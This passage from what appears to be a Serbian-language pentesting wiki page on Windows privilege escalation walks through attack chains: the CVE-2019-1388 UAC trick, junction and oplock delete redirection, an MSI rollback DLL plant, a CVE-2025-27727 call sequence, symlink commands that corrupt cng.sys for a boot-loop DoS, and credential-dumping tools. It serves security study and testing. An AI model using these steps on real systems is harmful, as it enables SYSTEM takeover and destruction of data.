1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Imate sve potrebne datoteke i informacije u sledećem GitHub repozitorijumu:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od Administrator Medium do nivoa visokog integriteta / UAC Bypass

Pročitajte ovo da biste **naučili o nivoima integriteta**:


{{#ref}}
integrity-levels.md
{{#endref}}

Zatim **pročitajte ovo da biste naučili o UAC-u i UAC bypass tehnikama:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Upload Directory Junctions u Served Root

Aplikacija može da kreira predvidljiv poddirektorijum za upload, upiše u njega ime datoteke koje je dostavio pozivalac, a zatim obradi tu datoteku. Ako korisnik sa niskim privilegijama može da ukloni i zameni taj poddirektorijum NTFS junction-om pre upisa na strani servera, upis može da prati junction do direktorijuma koji server izlaže na webu. Skripta postavljena tamo može da se pokrene pod identitetom web servisa ako server izvršava taj tip datoteke. Ovo je granica za proizvoljno upisivanje specifična za aplikaciju; direktorijum za upload sa dozvolom upisa ili postojeći junction sami po sebi to ne dokazuju.

Proverite tačnu konstrukciju putanje i vreme izvršavanja u obrađivaču upload-a, efektivna prava korisnika za brisanje/kreiranje poddirektorijuma, efektivne ACL-ove odredišta, da li proces koji upisuje prati reparse tačke i da li web server izvršava datoteke u tom odredištu. Zasebno potvrdite identitete procesa koji upisuje i web servera. Pasivni inventar može da prikaže ACL-ove direktorijuma i reparse metapodatke, ali ne može da utvrdi ponašanje obrađivača niti buduću zamenu junction-a. Ako se izvršavanje odvija pod nalogom servisa, pregledajte **stvarni token procesa** pre nego što razmotrite zaseban put eskalacije privilegija tokena.

## Čišćenje privilegovanog zakazanog zadatka pokrenuto preko WNF-a

Zakazani zadatak koji odbija ručno pokretanje i dalje može da izloži neprivilegovani okidač. Prilikom provere privilegovanog zadatka, izvezite njegov XML i pregledajte **sve** okidače, kao i DACL zadatka, principal i akciju. Konkretno, `WnfStateChangeTrigger` navodi stanje Windows Notification Facility (WNF); ako trenutni korisnik ima dozvolu da objavi ažuriranje u tom stanju koje je zaštićeno dozvolama, korisnik može posredno da pokrene zadatak pod identitetom koji mu je konfigurisan, iako je postavljeno `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Na primer, zadatak Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` radio je kao SYSTEM, prihvatao ažuriranja WNF stanja `7508BCA32C079E41` od standardnog korisnika, a zatim proveravao `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` čak i kada je Recall bio isključen.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Da biste testirali dostupnost, razrešite `ZwUpdateWnfStateData` iz `ntdll.dll`, pošaljite prazno ažuriranje za osmobaјtni naziv stanja i uporedite status vraćanja sa podacima o poslednjem pokretanju zadatka ili aktivnošću u Procmon-u. Sledeća umanjena proba koristi niz bajtova iz primera zadatka Recall; zamenite ga bajtovima izvezenim za zadatak koji testirate.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Pretvaranje rekurzivnog čišćenja u privilegovano brisanje

Korisni primitiv nije samo okidač, već privilegovana rutina za čišćenje koja prihvata direktorijum pod kontrolom napadača. Pratite operaciju od enumeracije do konačne izmene: otkrivanje profila/sesija, deca izabrana pomoću džokera, `SHCreateItemFromParsingName` i `IFileOperation::DeleteItem` jaki su pokazatelji da će se prethodno proverena putanja kasnije rekurzivno obilaziti. Ako se potomci ne otvaraju relativno u odnosu na pouzdane ručice direktorijuma i ne proveravaju pre brisanja, napadač može da promeni način razrešavanja putanje između enumeracije i upotrebe.<sup>[[43]](#references)</sup>

Uparite WNF okidač sa [oplock, junction i Object Manager symlink substitution](#from-folder-contents-delete-to-system-eop) opisanom u nastavku: oplock pauzira program za čišćenje nakon što izabere legitimno dete, dok se direktorijum predak sa dozvolom za pisanje zamenjuje tako da se po nastavku privilegovanog brisanja putanja razreši preko `\RPC Control` do zaštićene mete. U Recall lancu, ovo je omogućilo SYSTEM brisanje direktorijuma `C:\Config.Msi`, što je bilo potrebno za dokumentovanu MSI rollback tehniku.<sup>[[31]](#references)[[43]](#references)</sup>

### Ugnježdeni potomci zaobilaze površne popravke reparse point-a

Provera samo korena pod kontrolom napadača i njegovog neposrednog deteta ne obezbeđuje bezbednost rekurzivnog brisanja zasnovanog na putanji. Ostavite te proverene objekte legitimnim i premestite zamenu junction/oplock u dodatno dete ispod njih; `IFileOperation::DeleteItem` će na kraju doći do neproverenog potomka i pratiti njegovu novu metu. CVE-2026-20941 nastao je upravo zbog ove vrste nepotpune ispravke: prva Recall zakrpa proveravala je `UKP` i direktorijum čije je ime bilo u obliku GUID-a, ali je zadržala staru operaciju rekurzivnog brisanja.<sup>[[43]](#references)</sup>

Bezbedan obrazac je da se **svaki potomak** otvori relativno u odnosu na već pouzdanu ručicu direktorijuma, pribavi i proveri konačna razrešena putanja/objekat, a zatim primeni disposition za brisanje na tu proverenu ručicu. Nemojte proveriti prefiks, a zatim se vratiti na rekurzivno brisanje zasnovano na putanji. Prilikom pregleda zakrpe proverite i strukture na mestu stvarnog poziva: u ovom slučaju, pregled tokom izvršavanja strukture `OBJECT_ATTRIBUTES` u `NtCreateFile` pokazao je da `RootDirectory` nije null i da naziv `{GUID}\\secure_file.lock` predstavlja relativnu putanju, čime je opovrgnut obmanjujući izlaz dekompajlera koji je ukazivao na drugi primitiv `FILE_DELETE_ON_CLOSE`.<sup>[[43]](#references)</sup>

## Od proizvoljnog brisanja/premeštanja/preimenovanja direktorijuma do SYSTEM EoP

Tehnika opisana [**u ovom blog postu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), uz exploit kod [**dostupan ovde**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Napad se u osnovi sastoji od zloupotrebe funkcije rollback programa Windows Installer radi zamene legitimnih datoteka zlonamernim tokom procesa deinstalacije. Za to napadač treba da napravi **zlonamerni MSI installer** koji će se koristiti za otmicu direktorijuma `C:\Config.Msi`. Windows Installer će kasnije koristiti taj direktorijum za čuvanje rollback datoteka tokom deinstalacije drugih MSI paketa, a te rollback datoteke biće izmenjene tako da sadrže zlonamerni payload.

### Ubacivanje putanje čišćenja u Windows Installer COM (CVE-2025-27727)

Klijent sa niskim privilegijama može da pristupi SYSTEM servisu `msiexec.exe` preko COM objekta `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Reverzno inženjerstvo je identifikovalo relevantne pozive `IMsiServer` kao `MsiBeginTransactionW` na pomeraju `0xA0` u vtable-u, `SetEEUIDirectoryAndFilter` na `0xC8` i `CleanupTempPackages` na `0x50`. Ovi nazivi i pomeraji dobijeni su reverznim inženjerstvom i mogu se razlikovati između buildova.<sup>[[41]](#references)</sup>

Za korisnika koji nije administrator, `SetEEUIDirectoryAndFilter` impersonira pozivaoca samo tokom otvaranja prosleđene putanje sa `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` i `FILE_FLAG_OPEN_REPARSE_POINT`. Time se potvrđuje da pozivalac može da obriše direktorijum i sprečava praćenje reparse point-a, ali se **ne** vezuje provereni objekat datoteke za naknadno čišćenje niti dokazuje da ga je kreirao Windows Installer.<sup>[[41]](#references)</sup>

Nakon `MsiBeginTransactionW`, `SetEEUIDirectoryAndFilter` zakazuje putanju kao fasciklu bez obzira na argument filtera koji je prosledio pozivalac. Servis upisuje imenovanu vrednost `REG_DWORD` pod `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: ime vrednosti je putanja pod kontrolom pozivaoca, a podatak `0x00000002` označava fasciklu. Zatim `CleanupTempPackages(NULL, FALSE)` direktno pokreće čišćenje. Njegov privilegovani worker enumeriše vrednosti registra i prosleđuje stavke fascikli rekurzivnoj funkciji `FDeleteFolder` bez provere porekla putanje. Ako uobičajeno uklanjanje ne uspe, kod takođe poziva `LockdownPath`, briše atribute datoteke i pokušava ponovo.<sup>[[41]](#references)</sup>

Minimalni redosled poziva rekonstruisan iz `msi.dll` je:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Korisni primitiv je ponovno korišćenje putanje, a ne preusmeravanje junction-om. Registrujte `C:\Config.Msi` koji je kreirao napadač, uklonite ga i sačekajte da Windows Installer kasnije ponovo kreira istu putanju sa zaštićenim rollback podacima. Čišćenje veruje zastarelom imenu `TempPackages` i briše novi direktorijum kao SYSTEM. Ovo zaobilazi predviđenu granicu koju postavljaju `FILE_FLAG_OPEN_REPARSE_POINT` i mitigacija poverenja u preusmeravanje, jer nije potreban reparse point.<sup>[[41]](#references)</sup>

Ovaj primitiv za brisanje uklapa se u rollback lanac u nastavku: sačuvajte zaseban zapis `Installer\Folders`, obrišite zaštićeni `C:\Config.Msi`, ponovo ga kreirajte sa NULL DACL-om i zadržite handle sa dozvolom `WRITE_DAC` otvorenim pre nego što installer pooštri DACL. Unapred otvoreni handle može da vrati permisivni DACL pomoću `NtSetSecurityObject`, nakon čega se generisani `.rbs` može zameniti pre nastavka rollback-a.<sup>[[41]](#references)</sup>

Microsoft je ispravio putanju tako što je sprečio `CMsiTransaction::SetEEUIDirectoryAndFilter` da poziva `ScheduleFileOrFolderDelete` kada je omogućena nova feature gate opcija. COM poziv i dalje može da vrati uspeh, ali više ne dodaje putanju pod kontrolom napadača u `TempPackages`. Instalirajte bezbednosna ažuriranja za Windows iz aprila 2025, umesto da uspešan povratak metode koristite kao test za zakrpu.<sup>[[41]](#references)[[42]](#references)</sup>

Sažeta tehnika je sledeća:

1. **Faza 1 – Priprema za hijacking (ostavite `C:\Config.Msi` praznim)**

- Korak 1: Instalirajte MSI
    - Kreirajte `.msi` koji instalira bezopasnu datoteku (npr. `dummy.txt`) u direktorijum u koji može da se upisuje (`TARGETDIR`).
    - Označite installer kao **"UAC Compliant"**, kako bi ga mogao pokrenuti **korisnik koji nije administrator**.
    - Ostavite otvoren **handle** za datoteku nakon instalacije.

- Korak 2: Započnite deinstalaciju
    - Deinstalirajte isti `.msi`.
    - Proces deinstalacije počinje da premešta datoteke u `C:\Config.Msi` i preimenuje ih u `.rbf` datoteke (rollback rezervne kopije).
    - **Pratite otvoreni handle** pomoću `GetFinalPathNameByHandle` da biste otkrili kada datoteka postane `C:\Config.Msi\<random>.rbf`.

- Korak 3: Prilagođena sinhronizacija
    - `.msi` sadrži **prilagođenu uninstall akciju (`SyncOnRbfWritten`)** koja:
        - Signalizira kada je `.rbf` upisan.
        - Zatim **čeka** na drugi događaj pre nego što nastavi deinstalaciju.

- Korak 4: Sprečite brisanje `.rbf` datoteke
    - Kada primite signal, **otvorite `.rbf` datoteku** bez `FILE_SHARE_DELETE` — time **sprečavate njeno brisanje**.
    - Zatim **pošaljite signal nazad** kako bi deinstalacija mogla da se završi.
    - Windows Installer ne uspeva da obriše `.rbf`, a pošto ne može da obriše sav sadržaj, **`C:\Config.Msi` se ne uklanja**.

- Korak 5: Ručno obrišite `.rbf`
    - Vi, napadač, ručno brišete `.rbf` datoteku.
    - Sada je **`C:\Config.Msi` prazan**, spreman za hijacking.

> U ovom trenutku **aktivirajte ranjivost za brisanje proizvoljnog direktorijuma na nivou SYSTEM-a** kako biste obrisali `C:\Config.Msi`.

2. **Faza 2 – Zamena rollback skripti zlonamernim skriptama**

- Korak 6: Ponovo kreirajte `C:\Config.Msi` sa slabim ACL-ovima
    - Sami ponovo kreirajte direktorijum `C:\Config.Msi`.
    - Postavite **slabe DACL-ove** (npr. Everyone:F) i **ostavite otvoren handle** sa dozvolom `WRITE_DAC`.

- Korak 7: Pokrenite novu instalaciju
    - Ponovo instalirajte `.msi` sa sledećim vrednostima:
        - `TARGETDIR`: lokacija u koju može da se upisuje.
        - `ERROROUT`: promenljiva koja izaziva prinudni neuspeh.
    - Ova instalacija će se koristiti za ponovno pokretanje **rollback-a**, koji čita `.rbs` i `.rbf`.

- Korak 8: Pratite pojavu `.rbs` datoteke
    - Koristite `ReadDirectoryChangesW` da pratite `C:\Config.Msi` dok se ne pojavi novi `.rbs`.
    - Zabeležite njegovo ime datoteke.

- Korak 9: Sinhronizujte pre rollback-a
    - `.msi` sadrži **prilagođenu install akciju (`SyncBeforeRollback`)** koja:
        - Signalizira događaj kada se kreira `.rbs`.
        - Zatim **čeka** pre nastavka.

- Korak 10: Ponovo primenite slabe ACL-ove
    - Nakon prijema događaja `.rbs created`:
        - Windows Installer **ponovo primenjuje jake ACL-ove** na `C:\Config.Msi`.
        - Ali pošto i dalje imate handle sa dozvolom `WRITE_DAC`, možete **ponovo da primenite slabe ACL-ove**.

> ACL-ovi se **proveravaju samo prilikom otvaranja handle-a**, tako da i dalje možete da upisujete u direktorijum.

- Korak 11: Postavite lažne `.rbs` i `.rbf` datoteke
    - Zamenite `.rbs` datoteku **lažnom rollback skriptom** koja Windows-u nalaže da:
        - Vrati vašu `.rbf` datoteku (zlonamernu DLL datoteku) na **privilegovanu lokaciju** (npr. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Postavite lažnu `.rbf` datoteku koja sadrži **zlonamerni DLL payload na nivou SYSTEM-a**.

- Korak 12: Aktivirajte rollback
    - Pošaljite signal sinhronizacionom događaju kako bi se installer nastavio.
    - **Prilagođena akcija tipa 19 (`ErrorOut`)** podešena je tako da **namerno izazove neuspeh instalacije** u poznatom trenutku.
    - Time započinje **rollback**.

- Korak 13: SYSTEM instalira vašu DLL datoteku
    - Windows Installer:
        - Čita vaš zlonamerni `.rbs`.
        - Kopira vašu `.rbf` DLL datoteku na ciljnu lokaciju.
    - Sada imate svoju **zlonamernu DLL datoteku na putanji koju učitava SYSTEM**.

- Završni korak: Izvršite SYSTEM kod
    - Pokrenite pouzdan **auto-elevated binarni fajl** (npr. `osk.exe`) koji učitava DLL datoteku čiju ste putanju preuzeli.
    - **Gotovo**: vaš kod se izvršava **kao SYSTEM**.


### Od proizvoljnog brisanja/premeštanja/preimenovanja datoteka do SYSTEM EoP

Glavna MSI rollback tehnika (prethodna) pretpostavlja da možete da obrišete **ceo direktorijum** (npr. `C:\Config.Msi`). Ali šta ako vaša ranjivost omogućava samo **proizvoljno brisanje datoteka**?

Mogli biste da iskoristite **NTFS interne mehanizme**: svaki direktorijum ima skriveni alternativni tok podataka koji se zove:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ovaj stream čuva **metapodatke indeksa** fascikle.

Dakle, ako **obrišete stream `::$INDEX_ALLOCATION`** fascikle, NTFS **uklanja celu fasciklu** iz sistema datoteka.

To možete uraditi pomoću standardnih API-ja za brisanje datoteka, kao što su:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Iako pozivate API za brisanje *fajla*, on **briše samu fasciklu**.

### Od brisanja sadržaja fascikle do SYSTEM EoP
Šta ako vam vaš primitiv ne dozvoljava da brišete proizvoljne fajlove/fascikle, ali vam **dozvoljava da brišete *sadržaj* fascikle koju kontroliše napadač**?

1. Korak 1: Podesite fasciklu i fajl-mamac
- Napravite: `C:\temp\folder1`
- Unutar nje napravite: `C:\temp\folder1\file1.txt`

2. Korak 2: Postavite **oplock** na `file1.txt`
- **Oplock** **pauzira izvršavanje** kada privilegovani proces pokuša da obriše `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Korak 3: Pokrenite SYSTEM proces (npr., `SilentCleanup`)
- Ovaj proces skenira fascikle (npr., `%TEMP%`) i pokušava da izbriše njihov sadržaj.
- Kada dođe do `file1.txt`, **oplock se aktivira** i predaje kontrolu vašem callback-u.

4. Korak 4: Unutar oplock callback-a – preusmerite brisanje

- Opcija A: Premestite `file1.txt` na drugo mesto
    - Time se prazni `folder1` bez prekidanja oplock-a.
    - Nemojte direktno brisati `file1.txt` — time bi se oplock prerano oslobodio.

- Opcija B: Pretvorite `folder1` u **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opcija C: Kreirajte **symlink** u `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Ovo cilja interni NTFS tok koji čuva metapodatke fascikle — njegovim brisanjem briše se fascikla.

5. Korak 5: Oslobodite oplock
- SYSTEM proces nastavlja i pokušava da obriše `file1.txt`.
- Ali sada, zbog junction + symlink-a, zapravo briše:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Rezultat**: `C:\Config.Msi` briše SYSTEM.

### Od kreiranja proizvoljne fascikle do trajnog DoS-a

Iskoristite primitive koji omogućava da **kreirate proizvoljnu fasciklu kao SYSTEM/admin** — čak i ako **ne možete da upisujete datoteke** ili **postavite slabe dozvole**.

Kreirajte **fasciklu** (ne datoteku) sa imenom **kritičnog Windows driver-a**, npr.:
```
C:\Windows\System32\cng.sys
```

- Ova putanja obično odgovara kernel-mode driver-u `cng.sys`.
- Ako je **unapred kreirate kao fasciklu**, Windows neće uspeti da učita stvarni driver pri pokretanju.
- Zatim Windows pokušava da učita `cng.sys` tokom pokretanja.
- Nailazi na fasciklu, **ne uspeva da pronađe stvarni driver** i **ruši se ili zaustavlja pokretanje**.
- **Ne postoji rezervna opcija** ni **oporavak** bez spoljne intervencije (npr. popravke pokretanja ili pristupa disku).

### Od privilegovanih putanja za logove/rezervne kopije + OM symlinks do proizvoljnog prepisivanja fajlova / boot DoS

Kada **privilegovani servis** upisuje logove/izvoze na putanju pročitanu iz **konfiguracije sa dozvolom za upis**, preusmerite tu putanju pomoću **Object Manager symlinks + NTFS mount points** da biste privilegovani upis pretvorili u proizvoljno prepisivanje fajlova (čak i **bez SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Preduslovi**
- Konfiguracija koja čuva ciljnu putanju ima dozvolu za upis za napadača (npr. `%ProgramData%\...\.ini`).
- Mogućnost kreiranja mount point-a ka `\RPC Control` i OM file symlink-a (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Privilegovana operacija koja upisuje na tu putanju (log, izvoz, izveštaj).

**Primer lanca**
1. Pročitajte konfiguraciju da biste saznali privilegovanu destinaciju loga, npr. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` u `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Preusmerite putanju bez administratorskih privilegija:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Sačekajte da privilegovana komponenta upiše log (npr. administrator pokrene „send test SMS“). Upis se sada obavlja u `C:\Windows\System32\cng.sys`.
4. Pregledajte prepisanu metu (hex/PE parserom) da biste potvrdili oštećenje; ponovno pokretanje primorava Windows da učita izmenjenu putanju drajvera → **boot loop DoS**. Ovo se može primeniti i na bilo koju zaštićenu datoteku koju će privilegovana usluga otvoriti za upis.

> `cng.sys` se obično učitava iz `C:\Windows\System32\drivers\cng.sys`, ali ako kopija postoji u `C:\Windows\System32\cng.sys`, može se prvo pokušati učitati, što je čini pouzdanim odredištem za DoS pomoću oštećenih podataka.



## **Od High Integrity do System**

### **Nova usluga**

Ako već radite u procesu sa High Integrity nivoom, **put do SYSTEM** može biti jednostavan: samo **napravite i pokrenite novu uslugu**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Prilikom pravljenja servisnog binarnog fajla, uverite se da je validan servis ili da binarni fajl brzo obavlja potrebne radnje, jer će biti prekinut nakon 20s ako nije validan servis.

### AlwaysInstallElevated

Iz procesa sa visokim nivoom integriteta možete pokušati da **omogućite unose AlwaysInstallElevated u registru** i **instalirate** reverse shell koristeći _**.msi**_ wrapper.\
[Više informacija o ključevima registra koji su uključeni i o tome kako da instalirate _.msi_ paket možete pronaći ovde.](#alwaysinstallelevated)

### High + SeImpersonate privilegija za System

**Možete** [**pronaći kod ovde**](seimpersonate-from-high-to-system.md)**.**

### Od SeDebug + SeImpersonate do Full Token privilegija

Ako imate te privilegije tokena (verovatno ćete ih pronaći u procesu koji već ima visok nivo integriteta), moći ćete da **otvorite skoro bilo koji proces** (osim zaštićenih procesa) uz SeDebug privilegiju, **kopirate token** procesa i kreirate **proizvoljan proces sa tim tokenom**.\
Ova tehnika obično podrazumeva **izbor bilo kog procesa koji radi kao SYSTEM sa svim privilegijama tokena** (_da, možete pronaći SYSTEM procese bez svih privilegija tokena_).\
**Primer koda koji izvršava predloženu tehniku možete** [**pronaći ovde**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Meterpreter koristi ovu tehniku za eskalaciju u `getsystem`. Tehnika podrazumeva **kreiranje pipe-a, a zatim kreiranje/zloupotrebu servisa za pisanje u taj pipe**. Zatim će **server** koji je kreirao pipe koristeći privilegiju **`SeImpersonate`** moći da **impersonira token** klijenta pipe-a (servisa) i dobije SYSTEM privilegije.\
Ako želite da [**saznate više o named pipes, pročitajte ovo**](#named-pipe-client-impersonation).\
Ako želite da pročitate primer [**prelaska sa visokog nivoa integriteta na System pomoću named pipes, pročitajte ovo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ako uspete da **otmete DLL** koji **učitava** **proces** pokrenut kao **SYSTEM**, moći ćete da izvršite proizvoljan kod sa tim dozvolama. Zato je Dll Hijacking koristan i za ovu vrstu eskalacije privilegija. Štaviše, mnogo ga je **lakše izvesti iz procesa sa visokim nivoom integriteta**, jer će imati **dozvole za pisanje** u fascikle koje se koriste za učitavanje DLL-ova.\
**Više o Dll hijacking-u možete** [**saznati ovde**](dll-hijacking/index.html)**.**

### **Od Administrator ili Network Service do System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Od LOCAL SERVICE ili NETWORK SERVICE do svih privilegija

**Pročitajte:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Dodatna pomoć

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Korisni alati

**Najbolji alat za pronalaženje lokalnih vektora eskalacije privilegija u Windows-u:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Proverava pogrešne konfiguracije i osetljive fajlove (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detektovano.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Proverava neke moguće pogrešne konfiguracije i prikuplja informacije (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Proverava pogrešne konfiguracije**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Izvlači informacije o sačuvanim sesijama u PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Koristite -Thorough lokalno.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Izvlači akreditive iz Credential Manager-a. Detektovano.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Isprobava prikupljene lozinke na celom domenu**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh je PowerShell alat za ADIDNS/LLMNR/mDNS spoofing i man-in-the-middle napade.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Osnovno Windows nabrajanje za privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Traži poznate privesc ranjivosti (ZASTARELO, koristite Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne provere **(Potrebna su Admin prava)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Traži poznate privesc ranjivosti (potrebno je kompajlirati pomoću VisualStudio-a) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Pretražuje host u potrazi za pogrešnim konfiguracijama (više alat za prikupljanje informacija nego za privesc) (potrebno je kompajlirati) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Izvlači akreditive iz velikog broja softvera (precompiled exe na github-u)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp-a u C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Proverava pogrešne konfiguracije (precompiled izvršna datoteka na github-u). Ne preporučuje se. Ne radi dobro u Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Proverava moguće pogrešne konfiguracije (exe iz python-a). Ne preporučuje se. Ne radi dobro u Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Alat napravljen na osnovu ovog posta (za ispravan rad mu nije potreban accesschk, ali može da ga koristi).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita izlaz komande **systeminfo** i predlaže funkcionalne exploit-e (lokalni python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita izlaz komande **systeminfo** i predlaže funkcionalne exploit-e (lokalni Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projekat morate kompajlirati koristeći odgovarajuću verziju .NET-a ([pogledajte ovo](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Da biste videli instaliranu verziju .NET-a na hostu žrtve, možete pokrenuti:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Osnove eskalacije privilegija u Windows-u](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Eskalacija privilegija iskorišćavanjem slabih dozvola fascikli](http://www.greyhathacker.net/?p=738)
- [3] [Eskalacija privilegija u Windows-u – podsetnik](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop – radionica za lokalnu eskalaciju privilegija u Windows-u / Linux-u](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 – Napadi na Windows: AT je nova crna (Rob Fuller i Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Eskalacija privilegija – Windows – kompletan OSCP vodič](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows – eskalacija privilegija – PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Vodič za eskalaciju privilegija u Windows-u](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Kontrolna lista za eskalaciju privilegija u Windows-u](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Eskalacija privilegija u Windows-u](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metode eskalacije privilegija u Windows-u za pentestere](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
